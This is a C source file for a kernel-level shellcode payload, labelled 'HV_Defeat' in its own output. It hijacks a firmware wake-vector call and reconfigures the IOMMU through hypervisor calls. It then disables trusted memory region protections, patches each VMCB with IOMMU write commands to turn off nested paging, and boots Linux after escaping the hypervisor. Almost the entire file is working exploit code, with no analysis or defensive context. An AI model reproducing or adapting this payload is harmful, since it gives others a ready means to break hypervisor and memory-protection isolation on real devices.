#include "main.h"
#include "boot_linux.h"
#include "utils.h"
#include <stdint.h>

shellcode_kernel_args args = {0};

// We are being called instead of AcpiSetFirmwareWakingVector
__attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
                                                       uint64_t add2) {
  // We will do main checks on .text only with a reference to .data
  volatile shellcode_kernel_args *args_ptr =
      (volatile shellcode_kernel_args
           *)0x11AA11AA11AA11AA; // To be replaced with proper address in .kdata
                                 // by loader

  // "Hide" the pointer from the optimizer
  __asm__ volatile("" : "+r"(args_ptr));

  // We don't have required information - Abort
  if ((args_ptr->fun_printf & 0xFFFF) == 0) {
    goto out;
  }

  // Activate UART on Kernel
  uint32_t *uart_va = (uint32_t *)(args_ptr->dmap_base + 0xC0115110ULL);
  *uart_va &= ~0x200;
  uint32_t *override_char_va = (uint32_t *)args_ptr->kernel_uart_override;
  *override_char_va = 0x0;

  uint64_t iommu_cb2_pa =
      ((uint64_t(*)(uint64_t))args_ptr->fun_va_to_pa)(args_ptr->iommu_cb2_va);
  uint64_t iommu_cb3_pa =
      ((uint64_t(*)(uint64_t))args_ptr->fun_va_to_pa)(args_ptr->iommu_cb3_va);
  uint64_t iommu_eb_pa =
      ((uint64_t(*)(uint64_t))args_ptr->fun_va_to_pa)(args_ptr->iommu_eb_va);

  uint64_t unk;
  int n_devices;

  // Reconfigure IOMMU calling the HV
  int ret = ((uint64_t(*)(uint64_t, uint64_t, uint64_t, uint64_t,
                          int *))args_ptr->fun_hv_iommu_set_buffers)(
      iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t)&unk, &n_devices);

  if (ret != 0) {
    puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb X\n"});
    goto out;
  }

  ret = ((uint64_t(*)(void))args_ptr->fun_hv_iommu_wait_completion)();

  if (ret == 0) {
    puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb OK\n"});

    if (tmr_disable(args_ptr->dmap_base)) {
      puts_uart(args_ptr->dmap_base, (char[]){"TMR X\n"});
      goto out;
    }

    puts_uart(args_ptr->dmap_base, (char[]){"TMR OK\n"});

    patch_vmcb(args_ptr);

    puts_uart(args_ptr->dmap_base, (char[]){"VMCB OK\n"});

    // Re-do this to force a VMEXIT without HV injecting faults
    ((uint64_t(*)(uint64_t, uint64_t, uint64_t, uint64_t,
                  int *))args_ptr->fun_hv_iommu_set_buffers)(
        iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t)&unk, &n_devices);
    ((uint64_t(*)(void))args_ptr->fun_hv_iommu_wait_completion)();

    puts_uart(args_ptr->dmap_base, (char[]){"Back from HV\n"});

    // We can now initiate the global args variable and use it, as NPTs are
    // disabled
    init_global_pointers(args_ptr);

    printf("HV_Defeat: we should be ready for Linux part\n");

    boot_linux();
    printf("Linux prepared OK\n");

    printf("Calling smp_rendezvous to exit all cores to HV with ptr: %016lx\n",
           (uint64_t)vmmcall_dummy);
    printf("Good Bye VM :)\n");

    smp_rendezvous(smp_no_rendevous_barrier, vmmcall_dummy,
                   smp_no_rendevous_barrier, NULL);

    printf("We shouldn't be here :(\n");
  } else {
    puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb NO OK\n"});
  }

out:
  return 0;
}

__attribute__((noinline, optimize("O0"), naked)) void vmmcall_dummy(void) {
  __asm__ volatile("mov $0x1, %rax \n"
                   "vmmcall \n"
                   "ret \n");
}

void halt(void) { __asm__ __volatile__("hlt"); }

// Submit a single 16-byte command and wait for completion
__attribute__((noinline, optimize("O0"))) void
iommu_submit_cmd(volatile shellcode_kernel_args *args_ptr, uint64_t *cmd) {
  uint64_t curr_tail = *(
      (uint64_t *)args_ptr->iommu_mmio_va +
      IOMMU_MMIO_CB_TAIL /
          8);
  uint64_t next_tail = (curr_tail + IOMMU_CMD_ENTRY_SIZE) &
                       IOMMU_CB_MASK;

  uint64_t *cmd_buffer = (uint64_t *)args_ptr->iommu_cb2_va +
                         curr_tail / 8;

  cmd_buffer[0] = cmd[0];
  cmd_buffer[1] = cmd[1];

  __asm__ volatile("" : : : "memory");

  *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8) = next_tail;

  while (*((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_HEAD / 8) !=
         *((uint64_t *)args_ptr->iommu_mmio_va + IOMMU_MMIO_CB_TAIL / 8))
    ;
}

__attribute__((noinline, optimize("O0"))) void
iommu_write8_pa(volatile shellcode_kernel_args *args_ptr, uint64_t pa,
                uint64_t val) {
  uint32_t cmd[4] = {0};
  cmd[0] = (uint32_t)(pa & 0xFFFFFFF8) | 0x05;
  cmd[1] = ((uint32_t)(pa >> 32) & 0xFFFFF) | 0x10000000;
  cmd[2] = (uint32_t)(val);
  cmd[3] = (uint32_t)(val >> 32);
  iommu_submit_cmd(args_ptr, (uint64_t *)cmd);
}

__attribute__((noinline, optimize("O0"))) void
patch_vmcb(volatile shellcode_kernel_args *args_ptr) {
  for (int i = 0; i < 16; i++) {
    uint64_t pa = args_ptr->vmcb[i];

    iommu_write8_pa(args_ptr, pa + 0x00,
                    0x0000000000000000ULL);
    iommu_write8_pa(args_ptr, pa + 0x08,
                    0x0004000000000000ULL);
    iommu_write8_pa(args_ptr, pa + 0x10,
                    0x000000000000000FULL);
    iommu_write8_pa(args_ptr, pa + 0x58,
                    0x0000000000000001ULL);
    iommu_write8_pa(args_ptr, pa + 0x90,
                    0x0000000000000000ULL);
  }
}

__attribute__((noinline, optimize("O0"))) uint32_t tmr_read(uint64_t dmap,
                                                            uint32_t addr) {
  *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_INDEX_OFF) = addr;
  return *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_DATA_OFF);
}

__attribute__((noinline, optimize("O0"))) void
tmr_write(uint64_t dmap, uint32_t addr, uint32_t val) {
  *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_INDEX_OFF) = addr;
  *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_DATA_OFF) = val;
}

__attribute__((noinline, optimize("O0"))) int tmr_disable(uint64_t dmap) {
  for (int i = 0; i < 24; i++) {
    if (tmr_read(dmap, TMR_CONFIG(i)) != 0) {
      tmr_write(dmap, TMR_CONFIG(i), 0);
      if (tmr_read(dmap, TMR_CONFIG(i)) != 0) {
        return -1;
      }
    }
  }
  return 0;
}

void init_global_pointers(volatile shellcode_kernel_args *args_ptr) {
  memcpy(&args, (void *)args_ptr, sizeof(args));

  printf = (void (*)(const char *, ...))args.fun_printf;
  smp_rendezvous = (void (*)(void (*)(void), void (*)(void), void (*)(void),
                             void *))args.fun_smp_rendezvous;
  smp_no_rendevous_barrier = (void (*)(void))args.fun_smp_no_rendevous_barrier;

  transmitter_control = (int (*)(int, void *))args.fun_transmitter_control;
  mp3_initialize = (int (*)(int))args.fun_mp3_initialize;
  mp3_invoke = (int (*)(int, void *, void *))args.fun_mp3_invoke;
  g_vbios = args.g_vbios;
}
